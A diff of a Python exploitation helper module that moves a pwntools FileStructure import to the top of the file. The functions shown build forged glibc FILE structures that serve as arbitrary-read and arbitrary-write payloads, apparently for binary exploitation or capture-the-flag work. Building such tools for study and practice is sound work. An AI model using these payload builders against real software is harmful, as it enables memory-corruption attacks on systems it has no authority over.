@@ -1,3 +1,5 @@
+from pwn import FileStructure
+
 
 def FILE_read_payload(src_addr: int, size: int, lock_addr: int):
     '''
@@ -24,8 +26,6 @@ def FILE_read_payload(src_addr: int, size: int, lock_addr: int):
     payload = FILE_read_payload(src_addr, 0x100, lock_addr)
     ```
     '''
-
-    from pwn import FileStructure
 
     f = FileStructure()
     f.flags, f.fileno = 0xfbad0800, 1
@@ -66,8 +66,6 @@ def FILE_write_payload(target_addr: int, size: int, lock_addr: int):
     ```
     '''
 
-    from pwn import FileStructure
-
     f = FileStructure()
     f.flags = 0xfbad0000
     f._IO_buf_base = target_addr
@@ -75,3 +73,4 @@ def FILE_write_payload(target_addr: int, size: int, lock_addr: int):
     f._lock = lock_addr
 
     return bytes(f)[:-8]
+
